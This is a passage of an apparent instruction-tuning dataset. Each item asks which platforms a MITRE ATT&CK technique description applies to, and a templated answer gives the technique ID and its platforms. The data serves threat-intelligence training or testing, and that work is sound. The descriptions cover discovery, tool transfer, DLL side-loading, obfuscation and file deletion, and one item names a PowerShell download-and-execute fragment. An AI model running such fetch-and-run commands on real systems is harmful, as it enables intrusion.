      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Domain Trust Discovery (T1482);\nTechnique Domain Trust Discovery (T1482) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.",
      "answer": "The provided description is related to MITRE technique Domain Trust Discovery (T1482);\nTechnique Domain Trust Discovery (T1482) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.",
    "context": "",
    "output": "The provided description is related to MITRE technique Lateral Tool Transfer (T1570);\nTechnique Lateral Tool Transfer (T1570) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.",
      "answer": "The provided description is related to MITRE technique Lateral Tool Transfer (T1570);\nTechnique Lateral Tool Transfer (T1570) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: AutoHotKey & AutoIT (T1059.010);\nTechnique Command and Scripting Interpreter: AutoHotKey & AutoIT (T1059.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: AutoHotKey & AutoIT (T1059.010);\nTechnique Command and Scripting Interpreter: AutoHotKey & AutoIT (T1059.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
      "answer": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Location Discovery: System Language Discovery (T1614.001);\nTechnique System Location Discovery: System Language Discovery (T1614.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
      "answer": "The provided description is related to MITRE technique System Location Discovery: System Language Discovery (T1614.001);\nTechnique System Location Discovery: System Language Discovery (T1614.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
